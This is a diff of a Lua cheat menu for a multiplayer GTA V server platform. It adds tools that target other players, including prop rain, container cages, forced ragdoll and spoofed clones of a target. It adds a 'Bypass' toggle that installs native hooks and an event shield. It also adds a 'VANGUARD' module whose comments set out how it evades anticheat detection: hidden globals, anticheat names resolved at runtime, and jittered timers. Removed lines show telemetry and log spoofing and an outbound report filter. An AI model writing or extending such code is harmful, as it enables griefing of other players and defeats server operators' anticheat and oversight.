+        local wantsAttach = not world and not inVehicle
+            and (not remote or attachToTarget)
 
         if wantsAttach then
-            attached = AttachToBone(obj, bone, ped)
+            attached = AttachToBone(obj, CurrentBone(), ped)
         end
 
-        if not attached then
+        if attached then
+            -- carried by the ped: no world collision, otherwise it shoves them
+            pcall(SetEntityCollision, obj, false, false)
+            pcall(SetEntityInvincible, obj, true)
+        else
+            -- real world prop: solid collision, planted on the ground
+            SetEntityCollision(obj, true, true)
+            SetEntityInvincible(obj, true)
             PlaceObjectOnGroundProperly(obj)
+            FreezeEntityPosition(obj, true)
         end
+
+        -- Mission-entity flag before the network ID exists: the object is then
+        -- never treated as disposable clutter by the engine cleanup pass.
+        pcall(SetEntityAsMissionEntity, obj, true, true)
 
         local netId = EnsureNetworked(obj)
+        if netId <= 0 then
+            -- a local-only object is a desync waiting to happen: drop it
+            pcall(DeleteObject, obj)
+            SetModelAsNoLongerNeeded(hash)
+            Notify(("Could not publish %s"):format(model), C.red)
+            return
+        end
+
         Spawned[#Spawned + 1] = obj
+        TrimSpawned()
 
         local suffix
         if remote then
-            suffix = attached and (" on " .. who) or (" at " .. who)
+            suffix = attached and (" on " .. who) or (" near " .. who)
         elseif attached then
-            suffix = " on " .. bone
+            suffix = " on " .. CurrentBoneLabel()
         else
             suffix = ""
         end
 
-        if netId > 0 then
-            Notify(("Spawned %s%s (net %d)"):format(model, suffix, netId), C.green)
-        else
-            Notify(("Spawned %s%s (local only)"):format(model, suffix), C.red)
-        end
-
+        Notify(("Spawned %s%s (net %d)"):format(model, suffix, netId), C.green)
         SetModelAsNoLongerNeeded(hash)
     end)
 end
 
 local function ClearProps()
+    local list = Spawned
+    Spawned = {}
+
     local removed = 0
-    for i = #Spawned, 1, -1 do
-        local obj = Spawned[i]
+    for i = #list, 1, -1 do
+        local obj = list[i]
         if obj and obj ~= 0 and DoesEntityExist(obj) then
             pcall(NetworkRequestControlOfEntity, obj)
             pcall(SetEntityAsMissionEntity, obj, true, true)
             if pcall(DeleteObject, obj) then removed = removed + 1 end
         end
-        Spawned[i] = nil
     end
 
-    pcall(function() LocalPlayer.state:set("lib:progressProps", {}, true) end)
     Notify(("%d prop(s) cleared"):format(removed), C.blue)
 end
 
@@ -15915,40 +15248,40 @@ local function SelectedEntry()
     return nil
 end
 
--- Spawns on all players in three modes: self, the selected player, or everyone
--- in the player list (capped so the network does not get flooded).
-local function SpawnOnTargets(model, extra)
+-- Spawns in three modes: self, the selected player, or everyone in the
+-- player list (capped so the network does not get flooded).
+local function SpawnOnTargets(entry)
     local mode = CFG.targetModes[S.targetMode] or "self"
 
     if mode == "self" then
-        SpawnProp(model, extra)
+        SpawnProp(entry)
         return
     end
 
     if mode == "player" then
         RefreshPlayers()
-        local entry = SelectedEntry()
-        if not entry then
+        local target = SelectedEntry()
+        if not target then
             Notify("No player in scope - spawned on you", C.blue)
-            SpawnProp(model, extra)
+            SpawnProp(entry)
             return
         end
-        SpawnProp(model, extra, entry.ped, entry.name, S.attachTarget)
+        SpawnProp(entry, entry.extra, target.ped, target.name, S.attachTarget)
         return
     end
 
     local count = RefreshPlayers()
     if count == 0 then
-        SpawnProp(model, extra)
+        SpawnProp(entry)
         return
     end
 
     local limit = math.min(count, 6)
     for i = 1, limit do
-        local entry = Players.list[i]
-        local okPed, ped = pcall(GetPlayerPed, entry.player)
+        local target = Players.list[i]
+        local okPed, ped = pcall(GetPlayerPed, target.player)
         if okPed and ped and ped ~= 0 and DoesEntityExist(ped) then
-            SpawnProp(model, extra, ped, entry.name, S.attachTarget)
+            SpawnProp(entry, entry.extra, ped, target.name, S.attachTarget)
         end
     end
 end
@@ -16034,37 +15367,24 @@ end
 
 local targetModeItem = Selector("Target", CFG.targetModes, S.targetMode, function(index)
     S.targetMode = index
-    Notify("Target mode: " .. tostring(CFG.targetModes[index]), C.blue)
 end)
 
 local playerItem
 
 playerItem = Selector("Player", { "none" }, 1, function(index)
     Players.index = index
-    local label = playerItem and playerItem.options and playerItem.options[index]
-    Notify("Target: " .. tostring(label or "none"), C.blue)
 end)
 
-local boneItem = Selector("Attach bone", CFG.bones, S.propBone, function(index)
-    S.propBone = index
+local boneItem = Selector("Attach point", CFG.boneLabels, S.attachBone, function(index)
+    S.attachBone = index
 end)
 
-local distanceItem = Selector("Distance", CFG.distances, S.propDistance, function(index)
-    S.propDistance = index
-end)
-
-vehicleItem = Selector("Model", vehicleLabels, S.vehicleModel, function(index)
-    S.vehicleModel = index
-end)
-
+-- LEFT / RIGHT on a selector do not fire onClick; read the live index on use.
 local function SyncSelectors()
-    -- LEFT / RIGHT do not fire onClick; read the live index on use.
     S.targetMode = math.max(1, math.min(#CFG.targetModes, targetModeItem.selected or 1))
-    S.propBone = math.max(1, math.min(#CFG.bones, boneItem.selected or 1))
-    S.propDistance = math.max(1, math.min(#CFG.distances, distanceItem.selected or 1))
 
-    if vehicleItem and vehicleItem.selected then
-        S.vehicleModel = math.max(1, math.min(#VEHICLES, vehicleItem.selected))
+    if boneItem and boneItem.selected then
+        S.attachBone = math.max(1, math.min(#CFG.boneOrder, boneItem.selected))
     end
 end
 
@@ -16091,177 +15411,530 @@ local function RefreshPlayerItem()
 
     if (playerItem.selected or 1) > #labels then playerItem.selected = 1 end
     PlayerItemSync()
+    return count
 end
 
-local function SpawnPropOnTargets(model, extra)
+local function SpawnPropOnTargets(entry)
     SyncSelectors()
     PlayerItemSync()
-    SpawnOnTargets(model, extra)
+
+    if not SpawnGate() then
+        Notify("Spawning too fast - throttled", C.grey)
+        return
+    end
+
+    SpawnOnTargets(entry)
 end
 
--- Prop entries -------------------------------------------------------------
+--------------------------------------------------------------------------------
+-- PROP EFFECTS
+--------------------------------------------------------------------------------
+
+-- Same three targeting modes as the spawner, but without spawning anything on
+-- the local ped when a remote target is selected.
+local function EachTarget(fn)
+    SyncSelectors()
+    PlayerItemSync()
+
+    local mode = CFG.targetModes[S.targetMode] or "self"
+
+    if mode == "self" then
+        fn(PlayerPedId(), nil)
+        return
+    end
+
+    RefreshPlayers()
+
+    if mode == "player" then
+        local target = SelectedEntry()
+        if not target then
+            fn(PlayerPedId(), nil)
+            return
+        end
+        fn(target.ped, target.name)
+        return
+    end
+
+    if #Players.list == 0 then
+        fn(PlayerPedId(), nil)
+        return
+    end
+
+    -- Effects are heavier than a single prop: cap the blast radius.
+    local limit = math.min(#Players.list, 3)
+    for i = 1, limit do
+        local target = Players.list[i]
+        local okPed, ped = pcall(GetPlayerPed, target.player)
+        if okPed and ped and ped ~= 0 and DoesEntityExist(ped) then
+            fn(ped, target.name)
+        end
+    end
+end
+
+local function FxTrack(obj, seconds)
+    if type(obj) ~= "number" or obj == 0 then return end
+    FxExpiry[#FxExpiry + 1] = {
+        obj = obj,
+        at = GetGameTimer() + math.floor((seconds or 30) * 1000),
+    }
+end
+
+-- One-shot networked object for an effect. Same publication path as the
+-- props, but no attachment: the physics does the show.
+local function FxProp(model, x, y, z, heading, freeze)
+    local hash = GetHashKey(model)
+    local loaded = LoadModel(hash, model)
+
+    if not loaded then return 0 end
+
+    local obj = CreateObject(hash, x, y, z, true, true, false)
+    if not obj or obj == 0 then
+        SetModelAsNoLongerNeeded(hash)
+        return 0
+    end
+
+    SetEntityRotation(obj, 0.0, 0.0, heading + 0.0, 2, true)
+    pcall(SetEntityAsMissionEntity, obj, true, true)
+    SetEntityInvincible(obj, true)
+
+    if freeze then
+        PlaceObjectOnGroundProperly(obj)
+        FreezeEntityPosition(obj, true)
+    end
+
+    local netId = EnsureNetworked(obj)
+    if netId <= 0 then
+        pcall(DeleteObject, obj)
+        SetModelAsNoLongerNeeded(hash)
+        return 0
+    end
+
+    SetModelAsNoLongerNeeded(hash)
+    Spawned[#Spawned + 1] = obj
+    TrimSpawned()
+    return obj
+end
+
+-- 1. Prop rain: the target gets a short shower of props from the sky.
+local function FxRain()
+    if not SpawnGate() then
+        Notify("Spawning too fast - throttled", C.grey)
+        return
+    end
+
+    EachTarget(function(ped, name)
+        Citizen.CreateThread(function()
+            local origin = GetEntityCoords(ped)
+
+            for i = 1, 4 do
+                local model = (i % 2 == 1) and "prop_roadcone02a" or "prop_barrel_02a"
+                local obj = FxProp(model,
+                    origin.x + (math.random() - 0.5) * 7.0,
+                    origin.y + (math.random() - 0.5) * 7.0,
+                    origin.z + 10.0 + i * 1.6,
+                    math.random(0, 359),
+                    false)
+
+                FxTrack(obj, 30)
+                Citizen.Wait(80)
+            end
+        end)
+
+        Notify(("Prop rain on %s"):format(name or "you"), C.blue)
+    end)
+end
+
+-- 2. Fountain: the props are launched upward and outward.
+local function FxFountain()
+    if not SpawnGate() then
+        Notify("Spawning too fast - throttled", C.grey)
+        return
+    end
+
+    EachTarget(function(ped, name)
+        Citizen.CreateThread(function()
+            local origin = GetEntityCoords(ped)
+
+            for i = 1, 6 do
+                local obj = FxProp("prop_roadcone02a",
+                    origin.x + (math.random() - 0.5) * 1.2,
+                    origin.y + (math.random() - 0.5) * 1.2,
+                    origin.z + 1.0,
+                    math.random(0, 359),
+                    false)
+
+                if obj ~= 0 then
+                    pcall(SetEntityVelocity, obj,
+                        (math.random() - 0.5) * 7.0,
+                        (math.random() - 0.5) * 7.0,
+                        6.0 + math.random() * 3.0)
+                    FxTrack(obj, 25)
+                end
+
+                Citizen.Wait(60)
+            end
+        end)
+
+        Notify(("Prop fountain on %s"):format(name or "you"), C.blue)
+    end)
+end
+
+-- 3. Cage: four containers dropped around the target, aligned on its heading.
+local CAGE_OFFSETS = {
+    { x = 4.4, y = 0.0, rot = 90.0 },
+    { x = -4.4, y = 0.0, rot = 90.0 },
+    { x = 0.0, y = 4.4, rot = 0.0 },
+    { x = 0.0, y = -4.4, rot = 0.0 },
+}
+
+local function FxCage()
+    if not SpawnGate() then
+        Notify("Spawning too fast - throttled", C.grey)
+        return
+    end
+
+    EachTarget(function(ped, name)
+        Citizen.CreateThread(function()
+            local origin = GetEntityCoords(ped)
+            local heading = GetEntityHeading(ped)
+            local rad = math.rad(heading)
+            local cosH, sinH = math.cos(rad), math.sin(rad)
+
+            for i = 1, #CAGE_OFFSETS do
+                local offset = CAGE_OFFSETS[i]
+                local dx = offset.x * cosH - offset.y * sinH
+                local dy = offset.x * sinH + offset.y * cosH
+
+                local obj = FxProp("prop_container_01a",
+                    origin.x + dx,
+                    origin.y + dy,
+                    origin.z,
+                    heading + offset.rot,
+                    true)
+
+                FxTrack(obj, 60)
+                Citizen.Wait(90)
+            end
+        end)
+
+        Notify(("Cage on %s"):format(name or "you"), C.blue)
+    end)
+end
+
+-- 4. Orbit: three cones circle the target for a few seconds.
+local function FxOrbit()
+    if not SpawnGate() then
+        Notify("Spawning too fast - throttled", C.grey)
+        return
+    end
+
+    EachTarget(function(ped, name)
+        Citizen.CreateThread(function()
+            local origin = GetEntityCoords(ped)
+            local objects = {}
+
+            for i = 1, 3 do
+                local obj = FxProp("prop_roadcone02a",
+                    origin.x, origin.y, origin.z + 1.0, 0.0, false)
+
+                if obj ~= 0 then objects[#objects + 1] = obj end
+                Citizen.Wait(50)
+            end
+
+            if #objects == 0 then return end
+
+            local started = GetGameTimer()
+            local angle = 0.0
+
+            while GetGameTimer() - started < 7000 do
+                if not DoesEntityExist(ped) then break end
+
+                local centre = GetEntityCoords(ped)
+                angle = angle + 0.16
+
+                for i = 1, #objects do
+                    local a = angle + (i - 1) * (math.pi * 2.0 / #objects)
+
+                    pcall(SetEntityCoordsNoOffset, objects[i],
+                        centre.x + math.cos(a) * 2.4,
+                        centre.y + math.sin(a) * 2.4,
+                        centre.z + 1.0 + math.sin(a * 2.0) * 0.45,
+                        false, false, false)
+
+                    pcall(SetEntityRotation, objects[i], 0.0, 0.0,
+                        math.deg(a) + 90.0, 2, true)
+                end
+
+                Citizen.Wait(90)
+            end
+
+            for i = 1, #objects do DeleteProp(objects[i]) end
+        end)
+
+        Notify(("Orbit on %s"):format(name or "you"), C.blue)
+    end)
+end
+
+-- 5. Ragdoll: Susano extra native. RequestRagdoll takes the engine GUID, not
+-- the entity handle.
+local function RagdollTarget()
+    if type(Api.RequestRagdoll) ~= "function" then
+        Notify("RequestRagdoll unavailable", C.red)
+        return
+    end
+
+    local applied = 0
+
+    EachTarget(function(ped, name)
+        if not DoesEntityExist(ped) then return end
+
+        local guid = 0
+        if type(GetEntityGuid) == "function" then
+            local ok, value = pcall(GetEntityGuid, ped)
+            if ok and type(value) == "number" then guid = value end
+        end
+        if guid == 0 then guid = ped end
+
+        local ok = pcall(Api.RequestRagdoll, guid)
+        if not ok then
+            pcall(SetPedToRagdoll, ped, 4000, 4000, 0, true, true, false)
+        end
+
+        applied = applied + 1
+        Notify(("Ragdoll: %s"):format(name or "you"), C.blue)
+    end)
+
+    if applied == 0 then Notify("No target", C.red) end
+end
+
+-- 6. Decoy: a spoofed copy of the target, outfit included.
+local function DeleteClone(clone)
+    if clone and clone ~= 0 and DoesEntityExist(clone) then
+        pcall(SetEntityAsMissionEntity, clone, true, true)
+        pcall(DeletePed, clone)
+    end
+end
+
+local function SpawnClone()
+    if type(Api.CreateSpoofedPed) ~= "function" then
+        Notify("CreateSpoofedPed unavailable", C.red)
+        return
+    end
+
+    SyncSelectors()
+    PlayerItemSync()
+
+    -- "self" clones you; every other mode clones the selected player.
+    local target
+    if (CFG.targetModes[S.targetMode] or "self") ~= "self" then
+        target = SelectedEntry()
+    end
+
+    local ped = target and target.ped or PlayerPedId()
+
+    if not DoesEntityExist(ped) then
+        Notify("No target", C.red)
+        return
+    end
+
+    -- One clone at a time: each one is a networked ped the server can count.
+    for i = #Clones, 1, -1 do
+        DeleteClone(Clones[i].ped)
+        table.remove(Clones, i)
+    end
+
+    local model = GetEntityModel(ped)
+    local heading = GetEntityHeading(ped)
+    local at = GetOffsetFromEntityInWorldCoords(ped, 1.2, 0.4, 0.0)
+
+    local ok, clone = pcall(Api.CreateSpoofedPed, 4, model,
+        at.x, at.y, at.z, heading, true, false)
+
+    if not ok or type(clone) ~= "number" or clone == 0 then
+        Notify("Clone failed", C.red)
+        return
+    end
+
+    for i = 0, 11 do
+        local okD, drawable = pcall(GetPedDrawableVariation, ped, i)
+        local okT, texture = pcall(GetPedTextureVariation, ped, i)
+        local okP, palette = pcall(GetPedPaletteVariation, ped, i)
+
+        if okD and okT then
+            pcall(SetPedComponentVariation, clone, i, drawable, texture,
+                (okP and palette) or 0)
+        end
+    end
+
+    for i = 0, 7 do
+        local okD, drawable = pcall(GetPedPropIndex, ped, i)
+
+        if okD and type(drawable) == "number" and drawable ~= -1 then
+            local okT, texture = pcall(GetPedPropTextureIndex, ped, i)
+            pcall(SetPedPropIndex, clone, i, drawable, (okT and texture) or 0, true)
+        end
+    end
+
+    pcall(SetEntityAsMissionEntity, clone, true, true)
+    pcall(SetBlockingOfNonTemporaryEvents, clone, true)
+    pcall(SetPedCanRagdoll, clone, true)
+    pcall(TaskStartScenarioInPlace, clone, "WORLD_HUMAN_STAND_MOBILE", 0, true)
+
+    Clones[#Clones + 1] = {
+        ped = clone,
+        at = GetGameTimer() + 60000,
+    }
+
+    Notify(("Clone spawned%s"):format(target and (" - " .. target.name) or ""), C.green)
+end
+
+-- Prop entries ---------------------------------------------------------------
 
 local propActions = {}
 
 for i = 1, #PROP_LIST do
     local entry = PROP_LIST[i]
     propActions[#propActions + 1] = Action(entry.label, function()
-        SpawnPropOnTargets(entry.model, entry.extra)
+        SpawnPropOnTargets(entry)
     end)
 end
 
--- Tab contents -------------------------------------------------------------
+-- Player Props ---------------------------------------------------------------
 
-local guardItems = {
-    Sep("Hooks (local, never seen by the server)"),
-    Toggle("Anti teleport", S.antiTeleport, function(v) S.antiTeleport = v end),
-    Toggle("Anti health write", S.antiKill, function(v) S.antiKill = v end),
-    Toggle("Anti ped delete", S.antiDelete, function(v) S.antiDelete = v end),
-    Toggle("Anti attach", S.antiAttach, function(v) S.antiAttach = v end),
-    Toggle("Anti vehicle damage", S.antiVehicle, function(v) S.antiVehicle = v end),
-
-    Sep("Self-heal (no native blocking)"),
-    Toggle("Freeze self-heal", S.freezeHeal, function(v)
-        S.freezeHeal = v
-        if v then ApplyAntiFreeze() end
-    end),
-    Toggle("Spectate self-heal", S.spectateHeal, function(v)
-        S.spectateHeal = v
-        if v then ApplyAntiSpectate() end
-    end),
-    Toggle("Outfit guard", S.outfitGuard, function(v)
-        S.outfitGuard = v
-        if v then SnapshotOutfit() end
-    end),
-    Action("Save current outfit", function()
-        SnapshotOutfit()
-        Notify("Outfit saved", C.blue)
-    end),
-
-    Sep("Tank"),
-    Toggle("Harden (self)", S.harden, function(v)
-        S.harden = v
-        if v then ApplyHarden() else ClearHarden() end
-    end),
-    Toggle("Vehicle hardening", S.vehicleArmor, function(v) S.vehicleArmor = v end),
-}
-
-local stealthItems = {
-    Toggle("Log payload spoof", S.logSpoof, function(v) S.logSpoof = v end),
-    Toggle("Telemetry spoof", S.telemetry, function(v) ApplyTelemetry(v) end),
-    Toggle("Inbound event shield", S.eventShield, function(v)
-        S.eventShield = v
-        ApplyEventShield(v)
-    end),
-    Toggle("Outbound report filter", S.outbound, function(v) S.outbound = v end),
-    Toggle("Ghost mode", S.ghost, function(v)
-        S.ghost = v
-        if v then ApplyGhost() else ClearGhost() end
-    end),
-
-    Sep("Panic"),
-    Action("Disable stealth modules", function()
-        S.telemetry, S.ghost = false, false
-        S.harden, S.vehicleArmor = false, false
-        ApplyTelemetry(false)
-        ClearGhost()
-        ClearHarden()
-        Notify("Stealth modules disabled", C.red)
-    end),
-}
-
-local propItems = {
+local playerItems = {
     Sep("Target"),
     targetModeItem,
     playerItem,
     Action("Refresh player list", function()
-        RefreshPlayerItem()
-        Notify(("%d player(s) in scope"):format(#Players.list), C.blue)
+        Notify(("%d player(s) in scope"):format(RefreshPlayerItem()), C.blue)
     end),
 
-    Sep("Options"),
-    Toggle("Attach on target", S.attachTarget, function(v) S.attachTarget = v end),
+    Sep("Attachment"),
+    Toggle("Attach to player", S.attachTarget, function(v) S.attachTarget = v end),
     boneItem,
-    distanceItem,
 
     Sep("Spawn on target"),
 }
 
-for i = 1, #propActions do propItems[#propItems + 1] = propActions[i] end
+for i = 1, #propActions do playerItems[#playerItems + 1] = propActions[i] end
 
-propItems[#propItems + 1] = Sep("")
-propItems[#propItems + 1] = Action("Clear my props", ClearProps)
+playerItems[#playerItems + 1] = Sep("Effects")
+playerItems[#playerItems + 1] = Action("Prop rain", FxRain)
+playerItems[#playerItems + 1] = Action("Prop fountain", FxFountain)
+playerItems[#playerItems + 1] = Action("Cage target", FxCage)
+playerItems[#playerItems + 1] = Action("Orbit target", FxOrbit)
+playerItems[#playerItems + 1] = Action("Ragdoll target", RagdollTarget)
+playerItems[#playerItems + 1] = Action("Decoy clone", SpawnClone)
 
-local vehicleItems = {
-    vehicleItem,
-    Action("Spawn spoofed vehicle", SpawnSpoofedVehicle),
-    Toggle("Warp into it", S.vehicleWarp, function(v) S.vehicleWarp = v end),
-    Action("Delete last vehicle", DeleteLastVehicle),
+playerItems[#playerItems + 1] = Action("Clear my props", ClearProps)
 
-    Sep("Hold"),
-    Toggle("Vehicle armour", S.vehicleArmor, function(v) S.vehicleArmor = v end),
-    Action("Repair vehicle", RepairVehicle),
-}
+-- Seed entry ---------------------------------------------------------------
+--
+-- One line, in the base menu's existing Exploit > Bypass tab. Clicking it
+-- arms the whole module: native hooks + event shield + a fresh event scan.
+-- Clicking again releases everything.
 
+local function BlockedCount()
+    local count = 0
+    for _ in pairs(blockedByShield) do count = count + 1 end
+    return count
+end
+
+local seedItem = Toggle("Seed (legacy)", S.hooks, function(state)
+    S.hooks = state
+
+    if state then
+        InstallNativeHooks()
+        ApplyEventShield(true)
+        RefreshPlayerItem()
+        Notify(("Seed loaded - %d hooks, %d event(s)"):format(
+            HookStats.installed, BlockedCount()), C.green)
+    else
+        RemoveNativeHooks()
+        ApplyEventShield(false)
+        Notify("Seed unloaded - hooks and event shield released", C.grey)
+    end
+end)
+
+-- The base menu owns the Bypass tab: only append one item to it.
+local function AttachSeed(item)
+    if type(Menu.Categories) ~= "table" then return false end
+
+    for i = 1, #Menu.Categories do
+        local category = Menu.Categories[i]
+        for t = 1, #(category.tabs or {}) do
+            local tab = category.tabs[t]
+            if tab.name == "Bypass" and type(tab.items) == "table" then
+                tab.items[#tab.items + 1] = item
+                return true
+            end
+        end
+    end
+
+    return false
+end
+
+-- Registrations --------------------------------------------------------------
+
+-- The library only opens entries flagged hasTabs, so each category carries a
+-- single tab.
 table.insert(Menu.Categories, {
-    name = "Seed",
+    name = "Player Props",
     hasTabs = true,
     tabs = {
-        { name = "Player",  items = propItems },
-        { name = "Vehicle", items = vehicleItems },
-        { name = "Stealth", items = stealthItems },
-        { name = "Guard",   items = guardItems },
+        { name = "Actions", items = playerItems },
     },
 })
 
-local seedIndex = #Menu.Categories
-Log("INFO", "Seed category added at position %d (%d categories total)",
-    seedIndex, #Menu.Categories)
+if not AttachSeed(seedItem) then
+    Log("WARN", "Bypass tab not found - standalone entry created")
+    table.insert(Menu.Categories, {
+        name = "Bypass",
+        hasTabs = true,
+        tabs = {
+            { name = "Bypass", items = { seedItem } },
+        },
+    })
+end
+
+Log("INFO", "categories added (%d total)", #Menu.Categories)
 
 --------------------------------------------------------------------------------
 -- KEYS
 --------------------------------------------------------------------------------
 
 -- Intentionally untouched: Menu.SelectedKey, Menu.SelectingKey and the whole
--- input loop belong to the loader and its library. No extra key is bound here,
--- so the menu keeps exactly the keys it had before this module was appended.
+-- input loop belong to the loader and its library.
 
 --------------------------------------------------------------------------------
 -- BACKGROUND LOOPS
 --------------------------------------------------------------------------------
 
+-- Recycle props left behind: a long-lived trail of networked objects is the
+-- easiest thing for a server to correlate with a player.
 Citizen.CreateThread(function()
     while true do
-        if S.ghost then ApplyGhost() end
-        Citizen.Wait(CFG.ghostRate)
-    end
-end)
-
-Citizen.CreateThread(function()
-    while true do
-        if S.harden then ApplyHarden() end
-        Citizen.Wait(CFG.hardenRate)
-    end
-end)
-
-Citizen.CreateThread(function()
-    while true do
-        if S.freezeHeal then ApplyAntiFreeze() end
-        Citizen.Wait(CFG.freezeRate)
-    end
-end)
-
-Citizen.CreateThread(function()
-    while true do
-        if S.spectateHeal then ApplyAntiSpectate() end
-        Citizen.Wait(CFG.spectateRate)
-    end
-end)
-
-Citizen.CreateThread(function()
-    while true do
-        if S.outfitGuard then ApplyOutfitGuard() end
-        Citizen.Wait(1000)
+        Citizen.Wait(5000)
+        local ped = PlayerPedId()
+        if ped ~= 0 and #Spawned > 0 then
+            local origin = GetEntityCoords(ped)
+            for i = #Spawned, 1, -1 do
+                local obj = Spawned[i]
+                if not obj or obj == 0 or not DoesEntityExist(obj) then
+                    table.remove(Spawned, i)
+                else
+                    local okPos, pos = pcall(GetEntityCoords, obj)
+                    if okPos and pos then
+                        local dx = pos.x - origin.x
+                        local dy = pos.y - origin.y
+                        local dz = pos.z - origin.z
+                        if (dx * dx + dy * dy + dz * dz) > 90000.0 then
+                            DeleteProp(obj)
+                        end
+                    end
+                end
+            end
+        end
     end
 end)
 
@@ -16273,13 +15946,43 @@ Citizen.CreateThread(function()
     end
 end)
 
+-- Effect objects and decoy clones live on a timer. Without this, a few minutes
+-- of trolling leaves dozens of networked entities behind the player.
 Citizen.CreateThread(function()
     Citizen.Wait(4000)
-    SweepEvents(false)
-
     while true do
-        Citizen.Wait(CFG.sweepRate)
-        SweepEvents(false)
+        local now = GetGameTimer()
+
+        for i = #FxExpiry, 1, -1 do
+            local entry = FxExpiry[i]
+            if now >= entry.at then
+                table.remove(FxExpiry, i)
+                if entry.obj and DoesEntityExist(entry.obj) then
+                    DeleteProp(entry.obj)
+                end
+            end
+        end
+
+        for i = #Clones, 1, -1 do
+            local entry = Clones[i]
+            if now >= entry.at or not DoesEntityExist(entry.ped) then
+                DeleteClone(entry.ped)
+                table.remove(Clones, i)
+            end
+        end
+
+        Citizen.Wait(2000)
+    end
+end)
+
+-- New resources register new events: rescan while the seed entry is loaded.
+Citizen.CreateThread(function()
+    Citizen.Wait(CFG.eventSweepRate)
+    while true do
+        if S.hooks then
+            SweepEvents()
+        end
+        Citizen.Wait(CFG.eventSweepRate)
     end
 end)
 
@@ -16287,37 +15990,5618 @@ end)
 -- BOOT
 --------------------------------------------------------------------------------
 
-InstallNativeHooks()
-InstallLuaFallbacks()
-InstallTelemetryHooks()
-ApplyTelemetry(S.telemetry)
-
-if type(_Stealth) == "table" then
-    _Stealth.blockAC = S.acFilter
-end
-
-ApplyEventShield(S.eventShield)
+-- Nothing is armed until the Seed entry is clicked in Exploit > Bypass.
 RefreshPlayerItem()
 
-Log("INFO", "loaded - Seed category appended, base menu keys untouched")
-Log("INFO", "state: telemetry=%s logSpoof=%s antiTeleport=%s harden=%s",
-    tostring(S.telemetry), tostring(S.logSpoof), tostring(S.antiTeleport), tostring(S.harden))
-
--- Debug handle (console only, nothing wired to the menu).
-_G.SeedMenu = {
-    State = S,
-    Hooks = HookStats,
-    Telemetry = TelemetryStats,
-    SpawnProp = SpawnProp,
-    SpawnOnTargets = SpawnOnTargets,
-    ClearProps = ClearProps,
-    RefreshPlayers = RefreshPlayers,
-    SpawnSpoofedVehicle = SpawnSpoofedVehicle,
-    DeleteLastVehicle = DeleteLastVehicle,
-    Notify = Notify,
-    Outfit = { Save = SnapshotOutfit, Apply = ApplyOutfitGuard },
-    Open = function() Menu.Visible = true end,
-    Close = function() Menu.Visible = false end,
-}
+Log("INFO", "loaded - props + effects, seed entry in Bypass, keys untouched")
+Log("INFO", "seed=%s", tostring(S.hooks))
 
 end)()
+
+-- >>> VANGUARD MODULE BEGIN
+-- ============================================================================
+-- VANGUARD  (integrated artifact - edit src/ and rebuild)
+-- Generated: 2026-10-22 21:09:31
+--
+-- This block lives in loader.lua and in dist/loader.built.lua at the same
+-- time. It is the only place the local Menu table is in scope. Rebuilding
+-- replaces this marked block; everything above the marker is the base loader.
+-- ============================================================================
+
+local __vgd = (function()
+-- ---------------------------------------------------------------------------
+-- PART: 00_core.lua
+-- ---------------------------------------------------------------------------
+local O = (function()
+-- ============================================================================
+-- VANGUARD / 00 CORE
+-- ----------------------------------------------------------------------------
+-- Why this file exists:
+--   Every later layer needs the same three things and nothing else:
+--   a private state table, a jitter source, and one scheduler.
+--
+-- Evasion rationale for the choices here:
+--   * One upvalue table (O). No _G writes, so a resource that enumerates
+--     globals finds nothing that was not there before.
+--   * No string constants that name an anticheat. Names are discovered at
+--     runtime from resource metadata, so a source scan of this file yields
+--     nothing to signature.
+--   * All timing goes through O.every(), which applies a random spread to
+--     both the period and the phase. A perfectly regular timer is the
+--     cheapest fingerprint an AC can take; none of ours is regular.
+--   * Zero work when a feature is off: every loop checks its own flag before
+--     touching a native.
+-- ============================================================================
+
+local O = {
+    version = "1.0.0",
+    started = false,
+    build   = 0,
+}
+
+-- ---------------------------------------------------------------------------
+-- LOG (internal only). Never uses the game notification native: that native
+-- is itself a menu signature. Output goes to the executor console and to the
+-- Susano overlay, both of which sit outside the game's notification path.
+-- ---------------------------------------------------------------------------
+local LOG = {}
+local LOG_MAX = 80
+
+local function log(fmt, ...)
+    local msg = fmt
+    if select("#", ...) > 0 then
+        local ok, out = pcall(string.format, fmt, ...)
+        if ok then msg = out end
+    end
+    LOG[#LOG + 1] = { t = GetGameTimer(), m = tostring(msg) }
+    if #LOG > LOG_MAX then table.remove(LOG, 1) end
+    pcall(print, "[VGD] " .. tostring(msg))
+end
+O.log = log
+
+function O.logTail(n)
+    local out = {}
+    local first = math.max(1, #LOG - (n or 8) + 1)
+    for i = first, #LOG do out[#out + 1] = LOG[i].m end
+    return out
+end
+
+-- ---------------------------------------------------------------------------
+-- RNG. math.random is shared with the game and with every other script; we
+-- do not reseed it (that would be a global side effect). Instead we keep a
+-- private xorshift32 and seed it from values an AC cannot reproduce: the
+-- tick count at load, the ped handle, and the current camera coordinate bits.
+-- ---------------------------------------------------------------------------
+local rngState = 0
+
+local function seedRng()
+    local ped = PlayerPedId()
+    local cam = GetGameplayCamCoord()
+    local a = GetGameTimer() % 2147483648
+    local b = (math.floor(ped) * 7919 + 104729) % 2147483648
+    local c = math.floor((cam.x + cam.y * 3.0 + cam.z * 7.0) * 1000.0) % 2147483648
+    rngState = math.floor((a + b * 3 + c * 7) % 2147483646) + 1
+end
+seedRng()
+
+-- Portable LCG: no bitwise ops, so the exact same sequence is produced on a
+-- 64-bit Lua 5.4 runtime and in a test VM. Quality is irrelevant here; the
+-- only requirement is that two clients never share a phase.
+local function rnd()
+    rngState = (rngState * 1103515245 + 12345) % 2147483648
+    return rngState / 2147483648.0
+end
+O.rnd = rnd
+
+function O.range(lo, hi)
+    if hi <= lo then return lo end
+    return lo + rnd() * (hi - lo)
+end
+
+function O.int(lo, hi)
+    return math.floor(lo + rnd() * (hi - lo + 1) + 0.5)
+end
+
+function O.chance(p)
+    return rnd() < p
+end
+
+-- Jittered period: base * (1 +/- spread). Used by every loop.
+function O.jitter(base, spread)
+    return math.max(0, math.floor(base * (1.0 + (rnd() * 2.0 - 1.0) * (spread or 0.18))))
+end
+
+-- ---------------------------------------------------------------------------
+-- CONTEXT. One thread owns every native read the hooks need. A native call
+-- made from inside a native hook is the fastest way to deadlock the VM, so
+-- callbacks in 01_hooks.lua read only this table.
+-- ---------------------------------------------------------------------------
+local Ctx = {
+    ped = 0, player = 0, vehicle = 0,
+    health = 200, armour = 0,
+    speed = 0.0, coords = vector3(0, 0, 0),
+    groundZ = 0.0, height = 0.0,
+    inVehicle = false, driver = false,
+    dead = false, ragdoll = false,
+    at = 0,
+}
+O.Ctx = Ctx
+
+local ctxAcc = 0.0
+local function ctxTick(now, dt)
+    ctxAcc = ctxAcc + dt
